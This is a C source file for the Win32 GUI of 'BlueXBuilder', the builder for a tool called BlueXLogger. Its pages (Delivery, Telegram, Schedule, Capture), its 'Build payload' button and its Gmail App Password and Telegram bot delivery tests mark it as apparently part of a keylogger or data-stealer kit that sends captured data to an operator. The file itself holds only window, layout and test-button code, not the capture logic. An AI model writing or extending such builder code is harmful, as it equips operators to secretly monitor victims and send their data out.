/*============================================================================
 * BlueXLogger - src/builder/main.c
 * BlueXBuilder - the graphical configuration builder.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * The window is a single owner-drawn surface: a header strip, a left
 * navigation rail, a content area whose fields are laid out from the table in
 * state.c, and a footer carrying the status line, the watermark and the
 * action buttons. Only the text fields and the two read-only report panels
 * are stock controls; everything else is drawn from the palette in ui_theme.c
 * so that the result does not look like a default-themed Win32 dialog.
 *==========================================================================*/
#include "state.h"
#include "ui_theme.h"
#include "ui_widget.h"
#include "bxl_branding.h"
#include "bxl_resid.h"

/* ---- layout, in design units (96 DPI) -----------------------------------
 * The window geometry itself lives in state.h so that the chrome here and the
 * control table in state.c cannot drift apart. */
#define WIN_W      BLD_WIN_W
#define WIN_H      BLD_WIN_H
#define HEADER_H   BLD_HEADER_H
#define FOOTER_H   BLD_FOOTER_H
#define NAV_W      BLD_NAV_W

/* The rail starts below the header, not underneath it: the header strip runs
 * the full window width, so a nav item at y=30 would collide with the product
 * name. */
#define NAV_ITEM_X 14
#define NAV_ITEM_Y (HEADER_H + 18)
#define NAV_ITEM_W (NAV_W - 28)
#define NAV_ITEM_H 46
#define NAV_ITEM_GAP 4

#define BTN_H      40
#define BTN_Y      (WIN_H - FOOTER_H + (FOOTER_H - BTN_H) / 2)

static const struct {
    int id;
    const wchar_t *text;
    int style;
    int w;
} k_footer[] = {
    { IDC_LOAD,     L"Load profile",   UI_BTN_SECONDARY, 110 },
    { IDC_SAVE,     L"Save profile",   UI_BTN_SECONDARY, 110 },
    { IDC_TESTCONN, L"Test connection", UI_BTN_SECONDARY, 142 },
    { IDC_TESTMAIL, L"Send demo mail",  UI_BTN_SECONDARY, 142 },
    { IDC_BUILD,    L"Build payload",  UI_BTN_PRIMARY,   160 },
};
#define FOOTER_BTN_COUNT ((int)(sizeof(k_footer) / sizeof(k_footer[0])))

static const wchar_t *k_nav_text[PAGE_COUNT] = {
    L"Delivery", L"Telegram", L"Schedule", L"Capture", L"Advanced", L"Build"
};

static HWND   g_hwnd;
static HWND   g_about;
static HWND   g_footer[5];
#define FOOTER_BTN_MAX 5
static int    g_page    = PAGE_DELIVERY;
static int    g_nav_hover = -1;
static int    g_nav_sel   = PAGE_DELIVERY;
static HBRUSH g_log_brush;
static int    g_busy;
static int    g_marquee;

#define IDT_MARQUEE 1

/*----------------------------------------------------------------------------
 * Small helpers
 *--------------------------------------------------------------------------*/
static void content_rect(RECT *r)
{
    r->left   = ui_scale(NAV_W);
    r->top    = ui_scale(HEADER_H);
    r->right  = ui_scale(WIN_W);
    r->bottom = ui_scale(WIN_H - FOOTER_H);
}

static void nav_rect(int index, RECT *r)
{
    r->left   = ui_scale(NAV_ITEM_X);
    r->top    = ui_scale(NAV_ITEM_Y + index * (NAV_ITEM_H + NAV_ITEM_GAP));
    r->right  = r->left + ui_scale(NAV_ITEM_W);
    r->bottom = r->top + ui_scale(NAV_ITEM_H);
}

static int nav_hit(int x, int y)
{
    int i;
    for (i = 0; i < PAGE_COUNT; i++) {
        RECT r;
        POINT p;
        p.x = x; p.y = y;
        nav_rect(i, &r);
        if (PtInRect(&r, p)) return i;
    }
    return -1;
}

static void set_page(int page)
{
    g_page = page;
    g_nav_sel = page;
    bld_controls_show_page(g_hwnd, page);
    if (page == PAGE_BUILD) bld_state_summary();
    InvalidateRect(g_hwnd, NULL, FALSE);
}

static void busy_begin(void)
{
    g_busy = 1;
    g_marquee = 0;
    SetTimer(g_hwnd, IDT_MARQUEE, 25, NULL);
    SetCursor(LoadCursorW(NULL, IDC_WAIT));
}

static void busy_end(void)
{
    g_busy = 0;
    KillTimer(g_hwnd, IDT_MARQUEE);
    InvalidateRect(g_hwnd, NULL, FALSE);
}

/*----------------------------------------------------------------------------
 * Painting
 *--------------------------------------------------------------------------*/
static void paint_header(HDC dc, const RECT *client)
{
    RECT r = *client;

    r.bottom = ui_scale(HEADER_H);
    ui_gradient_v(dc, &r, g_pal.header, g_pal.surface);
    ui_hline(dc, 0, client->right, r.bottom - 1, g_pal.border);

    {
        RECT t;
        t.left = ui_scale(26); t.right = ui_scale(700);
        t.top = ui_scale(12);  t.bottom = ui_scale(44);
        ui_text(dc, &t, BXL_PRODUCT_NAME_W, g_font.title, g_pal.text,
                DT_LEFT | DT_VCENTER | DT_SINGLELINE);

        t.top = ui_scale(46); t.bottom = ui_scale(66);
        ui_text(dc, &t, L"Configuration builder", g_font.hint, g_pal.text_dim,
                DT_LEFT | DT_VCENTER | DT_SINGLELINE);
    }
}

static void paint_nav(HDC dc, const RECT *client)
{
    RECT r;
    int  i;

    BXL_UNUSED(client);

    r.left = 0;
    r.top = ui_scale(HEADER_H);
    r.right = ui_scale(NAV_W);
    r.bottom = ui_scale(WIN_H - FOOTER_H);
    ui_fill(dc, &r, g_pal.surface);

    /* Hairline separating the rail from the content area. */
    {
        RECT v;
        v.left = r.right - 1; v.top = r.top; v.right = r.right;
        v.bottom = r.bottom;
        ui_fill(dc, &v, g_pal.border);
    }

    for (i = 0; i < PAGE_COUNT; i++) {
        RECT     item;
        RECT     label;
        COLORREF txt;
        int      selected = (i == g_page);

        nav_rect(i, &item);

        if (selected) {
            ui_fill_round(dc, &item, ui_scale(8), g_pal.surface_hi);
        } else if (i == g_nav_hover) {
            ui_fill_round(dc, &item, ui_scale(8), g_pal.surface_hi2);
        }

        if (selected) {
            RECT bar;
            bar.left   = item.left + ui_scale(5);
            bar.right  = bar.left + ui_scale(3);
            bar.top    = item.top + ui_scale(12);
            bar.bottom = item.bottom - ui_scale(12);
            ui_fill_round(dc, &bar, ui_scale(2), g_pal.accent);
        }

        txt = selected ? g_pal.text
                       : (i == g_nav_hover ? g_pal.text : g_pal.text_dim);

        label = item;
        label.left += ui_scale(20);
        ui_text(dc, &label, k_nav_text[i], g_font.body, txt,
                DT_LEFT | DT_VCENTER | DT_SINGLELINE);
    }
}

static void paint_footer(HDC dc, const RECT *client)
{
    RECT r;
    RECT t;
    int  kind = 0;
    const wchar_t *status = bld_status_text(&kind);
    COLORREF sc;

    r.left = 0; r.right = client->right;
    r.top = ui_scale(WIN_H - FOOTER_H);
    r.bottom = ui_scale(WIN_H);
    ui_fill(dc, &r, g_pal.surface);
    ui_hline(dc, 0, client->right, r.top, g_pal.border);

    /* ---- indeterminate progress strip ---------------------------------- */
    if (g_busy) {
        RECT strip, fill;
        int  w = client->right;
        int  bar_w = ui_scale(180);
        int  span  = w + bar_w;
        int  x     = (g_marquee % span) - bar_w;

        strip.left = 0; strip.right = w;
        strip.top = r.top; strip.bottom = r.top + ui_scale(3);
        ui_fill(dc, &strip, g_pal.surface_hi);

        fill = strip;
        fill.left  = x;
        fill.right = x + bar_w;
        if (fill.left < 0) fill.left = 0;
        if (fill.right > w) fill.right = w;
        if (fill.right > fill.left) ui_fill(dc, &fill, g_pal.accent);
    }

    /* ---- status line ---------------------------------------------------- */
    sc = (kind == 1) ? g_pal.ok : (kind == 2) ? g_pal.err : g_pal.text_dim;
    t.left = ui_scale(24);
    /* Clear of the footer buttons, which occupy the rightmost 700 design
     * units (see k_footer). */
    t.right = ui_scale(WIN_W - 24 - 720);
    t.top = r.top + ui_scale(12);
    t.bottom = t.top + ui_scale(22);
    ui_text(dc, &t, status, g_font.body, sc,
            DT_LEFT | DT_VCENTER | DT_SINGLELINE | DT_END_ELLIPSIS);

    /* ---- watermark ------------------------------------------------------ */
    t.top = r.top + ui_scale(38);
    t.bottom = t.top + ui_scale(20);
    ui_text(dc, &t, BXL_WATERMARK_W, g_font.hint, g_pal.text_faint,
            DT_LEFT | DT_VCENTER | DT_SINGLELINE);
}

static void paint_all(HWND hwnd)
{
    PAINTSTRUCT ps;
    HDC     dc = BeginPaint(hwnd, &ps);
    RECT    client;
    HDC     mem;
    HBITMAP bmp;
    HGDIOBJ old;
    RECT    content;

    GetClientRect(hwnd, &client);

    /* Double-buffered: the nav rail, the field wells and the footer all
     * repaint on hover, and without this the whole window would flicker. */
    mem = CreateCompatibleDC(dc);
    bmp = CreateCompatibleBitmap(dc, client.right, client.bottom);
    old = SelectObject(mem, bmp);

    ui_fill(mem, &client, g_pal.bg);
    paint_header(mem, &client);
    paint_nav(mem, &client);

    content_rect(&content);
    ui_fill(mem, &content, g_pal.bg);
    bld_paint_page(hwnd, mem, g_page,
                   content.right - content.left,
                   content.bottom - content.top);

    paint_footer(mem, &client);

    BitBlt(dc, 0, 0, client.right, client.bottom, mem, 0, 0, SRCCOPY);

    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    EndPaint(hwnd, &ps);
}

/*----------------------------------------------------------------------------
 * Actions
 *--------------------------------------------------------------------------*/
static void show_about(HWND hwnd)
{
    wchar_t text[4096];
    HRSRC   hr;
    HGLOBAL hg;
    DWORD   n;
    const char *p;

    text[0] = 0;
    hr = FindResourceW(NULL, BXL_RES_ABOUT_W, RT_RCDATA);
    if (hr) {
        hg = LoadResource(NULL, hr);
        n  = SizeofResource(NULL, hr);
        p  = hg ? (const char *)LockResource(hg) : NULL;
        if (p && n) {
            if (!bxl_utf8_to_wide(p, text, BXL_COUNT_OF(text))) text[0] = 0;
        }
    }
    if (!text[0])
        StringCchPrintfW(text, BXL_COUNT_OF(text), L"%ls\r\n%ls",
                         BXL_PRODUCT_NAME_W, BXL_WATERMARK_W);

    MessageBoxW(hwnd, text, BXL_PRODUCT_NAME_W L" - About",
                MB_OK | MB_ICONINFORMATION);
}

static int pick_folder(HWND owner, wchar_t *out, size_t out_cch)
{
    BROWSEINFOW   bi;
    LPITEMIDLIST  pidl;
    wchar_t       buf[MAX_PATH * 2];

    memset(&bi, 0, sizeof(bi));
    bi.hwndOwner = owner;
    bi.lpszTitle = L"Choose a folder";
    bi.ulFlags   = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;

    pidl = SHBrowseForFolderW(&bi);
    if (!pidl) return BXL_FALSE;

    if (!SHGetPathFromIDListW(pidl, buf)) {
        CoTaskMemFree(pidl);
        return BXL_FALSE;
    }
    CoTaskMemFree(pidl);
    StringCchCopyW(out, out_cch, buf);
    return BXL_TRUE;
}

static void do_build(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];
    wchar_t   out[MAX_PATH * 2];

    if (!bld_state_pull(&cfg, err, BXL_COUNT_OF(err))) return;

    set_page(PAGE_BUILD);
    bld_log_clear();
    bld_status(L"Building the payload ...", 0);
    busy_begin();

    if (bld_build(&cfg, out, BXL_COUNT_OF(out), err, BXL_COUNT_OF(err))) {
        bld_status(L"Build succeeded: %ls", 1, out);
        bld_log(L"");
        bld_log(L"Output: %ls", out);
    } else {
        bld_status(L"Build failed: %ls", 2, err);
        MessageBoxW(hwnd, err, L"Build failed", MB_OK | MB_ICONERROR);
    }

    busy_end();
}

/* The two footer test buttons mean different things per channel, so they are
 * relabelled rather than duplicated: "Test connection" is a Gmail concept, and
 * saying so while the Telegram channel is selected would be misleading. */
static void update_footer_for_channel(HWND hwnd)
{
    HWND conn = GetDlgItem(hwnd, IDC_TESTCONN);
    HWND mail = GetDlgItem(hwnd, IDC_TESTMAIL);
    int  telegram_only = (bld_channel_current() == BXL_CHANNEL_TELEGRAM);

    if (conn) SetWindowTextW(conn, telegram_only ? L"Verify bot"
                                                 : L"Test connection");
    if (mail) SetWindowTextW(mail, telegram_only ? L"Send test message"
                                                 : L"Send demo mail");
}

static void do_test_connection(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];

    if (!bld_state_pull(&cfg, err, BXL_COUNT_OF(err))) return;

    set_page(PAGE_BUILD);
    busy_begin();

    if (cfg.channel == BXL_CHANNEL_TELEGRAM) {
        bld_status(L"Verifying the Telegram bot ...", 0);
        if (bld_test_telegram(&cfg, err, BXL_COUNT_OF(err))) {
            bld_status(L"Bot verified - the token was accepted by Telegram.", 1);
            MessageBoxW(hwnd,
                        L"The bot token is valid and api.telegram.org is "
                        L"reachable.\r\n\r\n"
                        L"Nothing was posted to the chat. Use \"Send test "
                        L"message\" for a real delivery.",
                        L"Bot verified", MB_OK | MB_ICONINFORMATION);
        } else {
            bld_status(L"Bot verification failed: %ls", 2, err);
            MessageBoxW(hwnd, err, L"Bot verification failed",
                        MB_OK | MB_ICONERROR);
        }
        busy_end();
        return;
    }

    bld_status(L"Connecting to the mail server ...", 0);

    if (bld_test_connection(&cfg, err, BXL_COUNT_OF(err))) {
        bld_status(L"Connection OK - TLS negotiated, credentials accepted.", 1);
        MessageBoxW(hwnd,
                    L"Connected successfully.\r\n\r\n"
                    L"The host was reachable, TLS was negotiated and the "
                    L"sender address and App Password were accepted.\r\n\r\n"
                    L"Nothing was sent. Use \"Send demo mail\" for a real "
                    L"delivery to the recipient.",
                    L"Connection OK", MB_OK | MB_ICONINFORMATION);
    } else {
        bld_status(L"Connection failed: %ls", 2, err);
        MessageBoxW(hwnd, err, L"Connection failed", MB_OK | MB_ICONERROR);
    }

    busy_end();
}

static void do_test_email(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];

    if (!bld_state_pull(&cfg, err, BXL_COUNT_OF(err))) return;

    set_page(PAGE_BUILD);
    busy_begin();

    if (cfg.channel == BXL_CHANNEL_TELEGRAM) {
        bld_status(L"Posting a test message to the chat ...", 0);
        if (bld_test_telegram_demo(&cfg, err, BXL_COUNT_OF(err))) {
            bld_status(L"Test message delivered to the Telegram chat.", 1);
            MessageBoxW(hwnd, L"Telegram accepted the test message.\r\n"
                              L"Open the chat to see how the digest renders.",
                        L"Test message sent", MB_OK | MB_ICONINFORMATION);
        } else {
            bld_status(L"Test message failed: %ls", 2, err);
            MessageBoxW(hwnd, err, L"Test message failed", MB_OK | MB_ICONERROR);
        }
        busy_end();
        return;
    }

    bld_status(L"Sending a demo message ...", 0);

    if (bld_test_email(&cfg, err, BXL_COUNT_OF(err))) {
        bld_status(L"Demo mail accepted by the server.", 1);
        MessageBoxW(hwnd, L"The server accepted the demo message.\r\n"
                          L"Check the recipient inbox (and the spam folder).",
                    L"Demo mail sent", MB_OK | MB_ICONINFORMATION);
    } else {
        bld_status(L"Demo mail failed: %ls", 2, err);
        MessageBoxW(hwnd, err, L"Demo mail failed", MB_OK | MB_ICONERROR);
    }

    busy_end();
}

/* The Telegram page's own buttons act on Telegram regardless of the channel
 * selector, so the operator can test the bot before deciding to use it. */
static void do_verify_bot(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];

    if (!bld_state_pull(&cfg, err, BXL_COUNT_OF(err))) return;

    set_page(PAGE_BUILD);
    bld_status(L"Verifying the Telegram bot ...", 0);
    busy_begin();

    if (bld_test_telegram(&cfg, err, BXL_COUNT_OF(err))) {
        bld_status(L"Bot verified - the token was accepted by Telegram.", 1);
        MessageBoxW(hwnd,
                    L"The bot token is valid and api.telegram.org is "
                    L"reachable.\r\n\r\nNothing was posted to the chat.",
                    L"Bot verified", MB_OK | MB_ICONINFORMATION);
    } else {
        bld_status(L"Bot verification failed: %ls", 2, err);
        MessageBoxW(hwnd, err, L"Bot verification failed", MB_OK | MB_ICONERROR);
    }

    busy_end();
}

static void do_send_test_message(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];

    if (!bld_state_pull(&cfg, err, BXL_COUNT_OF(err))) return;

    set_page(PAGE_BUILD);
    bld_status(L"Posting a test message to the chat ...", 0);
    busy_begin();

    if (bld_test_telegram_demo(&cfg, err, BXL_COUNT_OF(err))) {
        bld_status(L"Test message delivered to the Telegram chat.", 1);
        MessageBoxW(hwnd, L"Telegram accepted the test message.\r\n"
                          L"Open the chat to see how the digest renders.",
                    L"Test message sent", MB_OK | MB_ICONINFORMATION);
    } else {
        bld_status(L"Test message failed: %ls", 2, err);
        MessageBoxW(hwnd, err, L"Test message failed", MB_OK | MB_ICONERROR);
    }

    busy_end();
}

static void do_save_profile(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];

    if (!bld_state_pull(&cfg, err, BXL_COUNT_OF(err))) return;

    if (bld_profile_save(&cfg, err, BXL_COUNT_OF(err)))
        bld_status(L"Profile saved.", 1);
    else if (err[0])
        bld_status(L"Save failed: %ls", 2, err);
    /* err empty == the operator cancelled the dialog. */
    BXL_UNUSED(hwnd);
}

static void do_load_profile(HWND hwnd)
{
    BxlConfig cfg;
    wchar_t   err[512];

    if (bld_profile_load(&cfg, err, BXL_COUNT_OF(err))) {
        bld_state_push(&cfg);
        bld_status(L"Profile loaded.", 1);
    } else if (err[0]) {
        bld_status(L"Load failed: %ls", 2, err);
        MessageBoxW(hwnd, err, L"Load failed", MB_OK | MB_ICONERROR);
    }
}

/* Push the surface colour behind every owner-drawn widget. Called once the
 * widgets exist and again after a DPI change rebuilds the palette. */
static void push_backgrounds(void)
{
    int i;

    if (g_about)
        ui_set_bg(g_about,
                  ui_gradient_v_at(22 + 34 / 2, HEADER_H, g_pal.header, g_pal.surface));

    for (i = 0; i < FOOTER_BTN_MAX; i++)
        if (g_footer[i]) ui_set_bg(g_footer[i], g_pal.surface);
}

/*----------------------------------------------------------------------------
 * Window procedure
 *--------------------------------------------------------------------------*/
static LRESULT CALLBACK MainWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg) {
    case WM_CREATE: {
        int i;
        int x;

        g_hwnd = hwnd;
        theme_init(hwnd);

        bld_controls_create(hwnd);
        bld_log_attach(bld_ctl(IDC_LOG));
        bld_controls_layout(hwnd, g_page, 0, 0);
        bld_controls_show_page(hwnd, g_page);

        /* About button, top right of the header. It is a ghost button, so its
         * body is unpainted at rest - hand it the exact gradient colour behind
         * its centre so it blends into the header strip. */
        g_about = ui_make_button(hwnd, IDC_ABOUT, L"About", UI_BTN_GHOST);
        SendMessageW(g_about, WM_SETFONT, (WPARAM)g_font.body, TRUE);

        /* Footer buttons, laid out right to left. */
        x = WIN_W - 24;
        for (i = FOOTER_BTN_COUNT - 1; i >= 0; i--) {
            HWND h = ui_make_button(hwnd, k_footer[i].id, k_footer[i].text,
                                    k_footer[i].style);
            SendMessageW(h, WM_SETFONT, (WPARAM)g_font.body, TRUE);
            if (i < FOOTER_BTN_MAX) g_footer[i] = h;
            x -= k_footer[i].w;
            MoveWindow(h, ui_scale(x), ui_scale(BTN_Y),
                       ui_scale(k_footer[i].w), ui_scale(BTN_H), TRUE);
            x -= 10;
        }

        MoveWindow(g_about, ui_scale(WIN_W - 24 - 104), ui_scale(22),
                   ui_scale(104), ui_scale(34), TRUE);

        push_backgrounds();

        {
            BxlConfig def;
            bld_state_defaults(&def);
            bld_state_push(&def);
        }

        update_footer_for_channel(hwnd);

        bld_status(L"Ready. Fill in the delivery settings, then build.", 0);
        bld_log(L"%ls", BXL_WATERMARK_W);
        bld_log(L"Builder ready. Configure the payload, then press Build.");
        return 0;
    }

    case WM_SIZE: {
        RECT c;
        content_rect(&c);
        bld_controls_layout(hwnd, g_page,
                            c.right - c.left, c.bottom - c.top);
        if (g_about)
            MoveWindow(g_about, ui_scale(WIN_W - 24 - 104), ui_scale(22),
                       ui_scale(104), ui_scale(34), TRUE);
        InvalidateRect(hwnd, NULL, FALSE);
        return 0;
    }

    case WM_ERASEBKGND:
        return 1;

    case WM_PAINT:
        paint_all(hwnd);
        return 0;

    case WM_DPICHANGED: {
        RECT *sug = (RECT *)lp;
        SetWindowPos(hwnd, NULL, sug->left, sug->top,
                     sug->right - sug->left, sug->bottom - sug->top,
                     SWP_NOZORDER | SWP_NOACTIVATE);
        theme_init(hwnd);
        push_backgrounds();
        SendMessageW(hwnd, WM_SIZE, 0, 0);
        return 0;
    }

    case WM_MOUSEMOVE: {
        int hit = nav_hit(GET_X_LPARAM(lp), GET_Y_LPARAM(lp));
        if (hit != g_nav_hover) {
            TRACKMOUSEEVENT tme;
            g_nav_hover = hit;
            tme.cbSize = sizeof(tme);
            tme.dwFlags = TME_LEAVE;
            tme.hwndTrack = hwnd;
            tme.dwHoverTime = 0;
            TrackMouseEvent(&tme);
            InvalidateRect(hwnd, NULL, FALSE);
        }
        return 0;
    }

    case WM_MOUSELEAVE:
        if (g_nav_hover != -1) {
            g_nav_hover = -1;
            InvalidateRect(hwnd, NULL, FALSE);
        }
        return 0;

    case WM_LBUTTONDOWN: {
        int hit = nav_hit(GET_X_LPARAM(lp), GET_Y_LPARAM(lp));
        if (hit >= 0) set_page(hit);
        return 0;
    }

    case WM_SETCURSOR:
        if (LOWORD(lp) == HTCLIENT && !g_busy &&
            nav_hit(GET_X_LPARAM(GetMessagePos()),
                    GET_Y_LPARAM(GetMessagePos())) >= 0) {
            SetCursor(LoadCursorW(NULL, IDC_HAND));
            return TRUE;
        }
        break;

    case WM_TIMER:
        if (wp == IDT_MARQUEE) {
            RECT r;
            r.left = 0; r.top = ui_scale(WIN_H - FOOTER_H) - ui_scale(2);
            r.right = ui_scale(WIN_W); r.bottom = r.top + ui_scale(8);
            g_marquee += ui_scale(14);
            InvalidateRect(hwnd, &r, FALSE);
        }
        return 0;

    case WM_CTLCOLOREDIT: {
        HDC dc = (HDC)wp;
        SetTextColor(dc, g_pal.text);
        SetBkColor(dc, g_pal.surface_hi);
        return (LRESULT)ui_edit_brush();
    }

    case WM_CTLCOLORSTATIC: {
        /* Read-only EDIT controls report through WM_CTLCOLORSTATIC. Both the
         * summary and the build log use the darker panel colour. */
        HDC dc = (HDC)wp;
        SetTextColor(dc, g_pal.text);
        SetBkColor(dc, g_pal.header);
        if (!g_log_brush) g_log_brush = CreateSolidBrush(g_pal.header);
        return (LRESULT)g_log_brush;
    }

    case WM_COMMAND: {
        int id = LOWORD(wp);

        /* IsDialogMessageW turns Enter and Escape into IDOK / IDCANCEL.
         * There is no default button on this form, so both are ignored. */
        if (id == IDOK || id == IDCANCEL) return 0;

        switch (id) {
        case IDC_ABOUT:
            show_about(hwnd);
            return 0;

        case IDC_BUILD:
            do_build(hwnd);
            return 0;

        case IDC_TESTCONN:
            do_test_connection(hwnd);
            return 0;

        case IDC_TESTMAIL:
            do_test_email(hwnd);
            return 0;

        case IDC_SAVE:
            do_save_profile(hwnd);
            return 0;

        case IDC_LOAD:
            do_load_profile(hwnd);
            return 0;

        case IDC_TLSMODE:
            bld_tls_mode_changed();
            bld_state_summary();
            return 0;

        case IDC_CHANNEL:
            bld_channel_changed();
            update_footer_for_channel(hwnd);
            return 0;

        case IDC_TGVERIFY:
            do_verify_bot(hwnd);
            return 0;

        case IDC_TGDEMO:
            do_send_test_message(hwnd);
            return 0;

        case IDC_SHOWPASS: {
            HWND h = bld_ctl(IDC_APPPASS);
            int  show = ui_get_check(bld_ctl(IDC_SHOWPASS));
            SendMessageW(h, EM_SETPASSWORDCHAR,
                         (WPARAM)(show ? 0 : L'\x25CF'), 0);
            InvalidateRect(h, NULL, TRUE);
            return 0;
        }

        case IDC_BROWSEDIR: {
            wchar_t dir[MAX_PATH * 2];
            if (pick_folder(hwnd, dir, BXL_COUNT_OF(dir))) {
                SetWindowTextW(bld_ctl(IDC_STORAGEDIR), dir);
                bld_state_summary();
            }
            return 0;
        }

        case IDC_BROWSEOUT: {
            wchar_t dir[MAX_PATH * 2];
            if (pick_folder(hwnd, dir, BXL_COUNT_OF(dir))) {
                SetWindowTextW(bld_ctl(IDC_OUTDIR), dir);
                bld_state_summary();
            }
            return 0;
        }

        default:
            break;
        }

        /* Any other notification means the operator changed a field. Keep the
         * live summary on the Build page honest without re-reading the whole
         * form on every keystroke. */
        if (HIWORD(wp) == 0 || HIWORD(wp) == EN_KILLFOCUS)
            bld_state_summary();
        return 0;
    }

    case WM_DESTROY:
        if (g_log_brush) { DeleteObject(g_log_brush); g_log_brush = NULL; }
        theme_free();
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wp, lp);
}

/*----------------------------------------------------------------------------
 * Entry point
 *--------------------------------------------------------------------------*/
int WINAPI wWinMain(HINSTANCE inst, HINSTANCE prev, LPWSTR cmdline, int show)
{
    WNDCLASSEXW wc;
    HWND        hwnd;
    MSG         msg;
    wchar_t     title[256];
    int         dpi;

    BXL_UNUSED(prev);
    BXL_UNUSED(cmdline);
    BXL_UNUSED(show);

    /* The shell dialogs (GetOpenFileName / SHBrowseForFolder) want an
     * apartment-threaded OLE. */
    OleInitialize(NULL);

    if (!ui_register_classes(inst)) return 1;

    memset(&wc, 0, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.style         = CS_HREDRAW | CS_VREDRAW | CS_DBLCLKS;
    wc.lpfnWndProc   = MainWndProc;
    wc.hInstance     = inst;
    wc.hIcon         = LoadIconW(inst, MAKEINTRESOURCEW(BXL_RES_ICON));
    wc.hIconSm       = wc.hIcon;
    wc.hCursor       = LoadCursorW(NULL, IDC_ARROW);
    wc.hbrBackground = NULL;
    wc.lpszClassName = L"BlueXBuilderWnd";
    if (!RegisterClassExW(&wc)) return 1;

    /* The watermark belongs in the window title as well as the footer. */
    StringCchPrintfW(title, BXL_COUNT_OF(title), L"%ls %ls - %ls",
                     BXL_PRODUCT_NAME_W, L"Builder", BXL_WATERMARK_W);

    /* Fixed-size form: the control table is laid out in absolute design units
     * relative to the CLIENT area, so the window must be sized to give exactly
     * that client area. Passing WIN_W/WIN_H straight to CreateWindowEx would
     * make them the outer size and leave the client ~15px narrower and ~38px
     * shorter, which silently clips the footer buttons and the right column.
     * WS_CLIPCHILDREN keeps the parent's double-buffered paint out of the
     * child rects. */
    {
        DWORD style   = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU |
                        WS_MINIMIZEBOX | WS_CLIPCHILDREN;
        RECT  wr      = { 0, 0, WIN_W, WIN_H };

        AdjustWindowRectEx(&wr, style, FALSE, 0);

        hwnd = CreateWindowExW(0, L"BlueXBuilderWnd", title, style,
                               CW_USEDEFAULT, CW_USEDEFAULT,
                               wr.right - wr.left, wr.bottom - wr.top,
                               NULL, NULL, inst, NULL);
    }
    if (!hwnd) return 1;

    dpi = (int)GetDpiForWindow(hwnd);
    if (dpi > 96) {
        RECT r;
        GetWindowRect(hwnd, &r);
        SetWindowPos(hwnd, NULL, 0, 0,
                     MulDiv(r.right - r.left, dpi, 96),
                     MulDiv(r.bottom - r.top, dpi, 96),
                     SWP_NOMOVE | SWP_NOZORDER | SWP_NOACTIVATE);
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        if (!IsDialogMessageW(hwnd, &msg)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    OleUninitialize();
    return 0;
}
